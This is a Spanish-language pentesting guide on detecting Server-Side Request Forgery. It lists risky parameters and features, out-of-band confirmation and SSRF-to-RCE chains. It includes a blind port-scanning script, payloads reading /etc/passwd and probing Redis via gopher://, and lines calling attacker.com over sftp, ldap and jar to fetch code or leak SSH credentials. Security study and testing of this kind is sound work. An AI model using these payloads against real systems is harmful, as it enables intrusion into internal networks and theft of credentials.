---
icon: server
---

# Server Side Request Forgery

Server-Side Request Forgery fuerza al servidor a realizar peticiones HTTP arbitrarias en nombre del atacante. El servidor actúa como proxy involuntario, dando acceso a recursos que normalmente son inaccesibles desde el exterior: red interna, localhost, y en entornos cloud los endpoints de metadata que contienen credenciales.

```
Sin SSRF:
Atacante → [FIREWALL] ✗ → Red interna / metadata

Con SSRF:
Atacante → Servidor web → [Sin restricciones] → Red interna / metadata
           (el servidor está dentro del perímetro)
```

### Impacto por contexto

```
En cualquier entorno:
→ Escaneo de puertos y hosts de la red interna
→ Acceso a paneles de administración internos (Jenkins, Grafana, Kibana...)
→ Lectura de archivos del sistema (con file://)
→ Interacción con servicios sin autenticación (Redis, Memcached, MongoDB...)

En entornos Cloud (AWS / Azure / GCP):
→ Acceso a endpoint de metadata → credenciales IAM temporales
→ Con credenciales IAM: acceso a S3, EC2, Lambda, bases de datos...
→ Potencialmente: compromiso completo de la cuenta cloud

SSRF → RCE (cadena):
→ SSRF → Redis sin auth → inyección de cron/SSH key → RCE
→ SSRF → Jenkins → Groovy console → RCE
→ SSRF → Consul API → register service with exec → RCE
→ SSRF → metadata cloud → credenciales → otra instancia → RCE
```

### Dónde buscar SSRF

#### Parámetros con nombres reveladores

```
url=       src=       href=      path=
dest=      redirect=  uri=       page=
feed=      host=      fetch=     endpoint=
callback=  return=    image=     img=
picture=   load=      file=      document=
reference= site=      html=      domain=
target=    open=      link=      from=
window=    next=      data=      import=
upload=    go=        navigate=  proxy=
forward=   continue=  gateway=   out=
view=      preview=   ping=      resource=
```

#### Funcionalidades de alto riesgo

```
→ "Cargar imagen desde URL"
→ "Importar datos desde URL externa"
→ "Vista previa de URL / link preview"
→ "Generación de PDF desde URL" (wkhtmltopdf, PhantomJS)
→ "Webhooks" (la app hace petición a la URL configurada)
→ "Integración con servicios externos"
→ "Verificar disponibilidad de URL"
→ "Compartir/embed de contenido externo"
→ "Importación de feeds RSS/Atom"
→ "SSO / OAuth callback" (redirect_uri)
→ "Exportar a formato externo"
→ "Resolver hostname / DNS lookup"
→ "Comprobación de certificado SSL"
→ Cualquier función que muestre el contenido de una URL remota
```

#### Cabeceras HTTP que controlan peticiones

```http
Referer: https://attacker.com/page
X-Forwarded-For: 127.0.0.1
Host: interno.empresa.local
X-Real-IP: 169.254.169.254
Origin: http://localhost
```

#### Formatos de archivo que hacen peticiones

```
SVG → puede hacer fetch de URLs externas
XML → XXE → SSRF
DOCX/XLSX → XML interno con referencias externas
PDF → puede tener JavaScript que hace fetch
M3U8 → HLS playlist con URLs de segmentos
```

### Detección básica

#### Paso 1 — Confirmar que el servidor hace peticiones

```bash
# Usar Burp Collaborator o Interactsh como receptor
# Interactsh (gratuito):
interactsh-client -v
# → Genera URL: abc123.oast.fun

# Payload mínimo en el parámetro sospechoso:
url=http://abc123.oast.fun
src=http://abc123.oast.fun/test
fetch=http://abc123.oast.fun

# Si Interactsh recibe una petición DNS o HTTP → SSRF confirmado
# Incluso si la respuesta de la app es un error → el servidor hizo la petición
```

#### Paso 2 — Distinguir error de "host no existe" vs "host existe"

```bash
# Comparar respuestas para detectar diferencias:

# Host que no existe (timeout o DNS error):
url=http://host-que-no-existe-abc123.com
→ Respuesta lenta (timeout) o error "DNS resolution failed"

# Host que existe (respuesta más rápida aunque sea error):
url=http://127.0.0.1
→ Respuesta rápida (connection refused o respuesta HTTP)

# Esta diferencia de tiempo/error es suficiente para confirmar SSRF
# aunque no veamos el contenido de la respuesta
```

#### Paso 3 — Intentar ver la respuesta

```bash
# Si la app refleja la respuesta en el output:
url=http://127.0.0.1:80/
→ Si devuelve HTML de una página interna = SSRF con output visible

# Si la app no refleja la respuesta (SSRF blind):
# → Usar Burp Collaborator / Interactsh para OOB
# → Medir tiempos de respuesta (port scanning ciego)
# → Forzar errores que revelen información (diferencia de respuesta)
```

### Tipos de SSRF

```
SSRF con respuesta visible (Non-blind):
→ La respuesta de la petición interna se muestra al atacante
→ Lectura directa de archivos, páginas internas, datos de servicios
→ Más fácil de explotar

SSRF blind / semi-blind:
→ La respuesta no se muestra, pero hay diferencia en el comportamiento
→ Puede ser: error distinto, tiempo de respuesta diferente, email enviado...
→ Requiere técnicas de inferencia o OOB

SSRF con redirecciones (semi-blind):
→ La app sigue redirecciones pero no muestra el destino final
→ Si se puede redirigir desde un servidor controlado → bypass de filtros
```

### Diferencia entre respuestas — Port scanning ciego

```python
import requests
import time

def probe_port(ssrf_url, host, port):
    """Detectar si un puerto está abierto midiendo el tiempo de respuesta"""
    payload = f"http://{host}:{port}/"
    start = time.time()
    try:
        r = requests.get(ssrf_url, params={"url": payload}, timeout=10)
        elapsed = time.time() - start
        return {
            "port": port,
            "status": r.status_code,
            "elapsed": round(elapsed, 2),
            "length": len(r.content),
            "open": elapsed < 3  # Respuesta rápida = puerto activo
        }
    except requests.exceptions.Timeout:
        return {"port": port, "open": False, "elapsed": 10}

# Escanear puertos comunes en localhost
ssrf_endpoint = "https://target.com/fetch"
puertos = [21,22,23,25,80,443,445,3000,3306,5432,5900,6379,8080,8443,8500,9200,27017]

for puerto in puertos:
    resultado = probe_port(ssrf_endpoint, "127.0.0.1", puerto)
    if resultado.get("open"):
        print(f"[OPEN] Puerto {resultado['port']} ({resultado['elapsed']}s)")
    else:
        print(f"[CLOSED] Puerto {resultado['port']}")
```

### Protocolos disponibles

No todos los clientes HTTP del servidor soportan todos los protocolos, pero merece la pena probarlos todos:

```bash
# HTTP/HTTPS (siempre disponible)
http://127.0.0.1/
https://127.0.0.1/

# file:// — leer archivos del sistema
file:///etc/passwd
file:///C:/Windows/win.ini

# dict:// — protocolo DICT (útil para fingerprinting de servicios)
dict://127.0.0.1:6379/info      # Redis INFO
dict://127.0.0.1:11211/stats    # Memcached stats

# gopher:// — enviar datos TCP arbitrarios (muy potente)
gopher://127.0.0.1:6379/_INFO   # Redis
gopher://127.0.0.1:25/EHLO%20x # SMTP

# sftp:// (Java, algunos lenguajes)
sftp://attacker.com:11111/      # Puede exfiltrar credenciales SSH

# ldap:// (Java, PHP)
ldap://attacker.com/

# tftp:// (PHP con curl)
tftp://attacker.com:69/

# ftp:// (PHP, Java)
ftp://attacker.com/

# jar:// (Java)
jar:http://attacker.com/exploit.jar!/
```

### Herramientas de detección

```bash
# Nuclei — detección automática
nuclei -u https://target.com -tags ssrf

# SSRFmap — detección y explotación
python3 ssrfmap.py -r request.txt -p url

# ffuf — fuzzing de parámetros para encontrar los vulnerables
ffuf -u "https://target.com/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -mc 200 -mr "127.0.0.1|localhost|internal"

# gau + grep para encontrar parámetros URL en targets
echo "target.com" | gau | grep -E "[?&](url|src|href|path|dest|redirect|uri|load|fetch)="

# Burp Suite — Active Scan detecta SSRF automáticamente
# + Collaborator para OOB
```

### Checklist de detección

```
□ Identificar todos los parámetros que aceptan URLs o rutas
□ Inyectar URL de Burp Collaborator / Interactsh en cada parámetro
□ Verificar si hay petición DNS/HTTP entrante → SSRF confirmado
□ Probar http://127.0.0.1/ para detectar servicios en localhost
□ Probar file:///etc/passwd para leer archivos
□ Probar http://169.254.169.254/ en posibles entornos cloud
□ Si hay filtros: probar representaciones alternativas de la IP
□ Buscar funcionalidades que impliquen peticiones del servidor (PDF, webhook, import)
□ Revisar cabeceras HTTP que puedan controlar peticiones (Host, Referer, X-Forwarded-For)
□ Probar en formatos de archivo: SVG, XML, DOCX
```

> Interactsh es la herramienta más rápida para confirmar SSRF blind: cualquier petición DNS que llegue, aunque la app devuelva error, confirma que el servidor está haciendo peticiones.

> En aplicaciones modernas, las funcionalidades de webhook y link preview son los puntos más frecuentes de SSRF porque por definición requieren que el servidor haga peticiones a URLs externas.

> Un parámetro que acepta URLs puede estar procesado por una librería de terceros (ImageMagick, wkhtmltopdf, ffmpeg) que tiene su propio comportamiento respecto a protocolos — probar todos aunque la app parezca solo aceptar HTTP.
